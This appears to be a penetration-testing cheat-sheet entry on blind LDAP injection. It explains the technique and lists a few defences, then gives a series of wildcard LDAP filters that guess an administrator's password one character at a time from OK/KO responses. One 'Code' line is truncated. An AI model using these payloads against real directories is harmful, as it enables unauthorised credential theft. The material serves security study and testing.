## Description

# Description

LDAP Injection is a type of application vulnerability that allows an attacker to inject malicious LDAP statements into an application, which in turn can result in unauthorized access or leakage of sensitive information. Blind exploitation is a technique used to extract information from the application without having any direct feedback from the application. This technique is used when the application does not return any error messages or output that can be used to infer the results of the injected queries. 

In this specific case, we can use a bypass login technique to extract data from the application using a series of LDAP queries. We can use the provided command to test different password combinations to identify the correct password.

 

## Requirements

1. Access to the application

 

## Defense

1. Input validation should be implemented to prevent malicious input from being injected into LDAP statements.

1. Application logging should be enabled to detect and investigate any suspicious activity.

1. Access controls should be implemented to restrict access to sensitive information and functionality.

 

## Objectives

1. Extract sensitive information from the application

 

# Instructions

1. Use the provided command to test different password combinations to identify the correct password. The command will return OK if the password is correct and KO if it is incorrect.

 



**Code**: [[(&(sn=administrator)(password=*))    : OK
(&(sn=ad]]



> The command uses a series of LDAP queries to test different password combinations. The query searches for an entry with the given surname (sn) and password. If the password is correct, the query will return OK, otherwise it will return KO. By testing different password combinations, we can identify the correct password and use it to extract sensitive information from the application.



**Command** ([[LDAP Password Enumeration]]):

```bash
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
(&(sn=administrator)(password=MY*))  : OK
(&(sn=administrator)(password=MYA*)) : KO
(&(sn=administrator)(password=MYB*)) : KO
(&(sn=administrator)(password=MYC*)) : KO
...
(&(sn=administrator)(password=MYK*)) : OK
(&(sn=administrator)(password=MYKE)) : OK
```
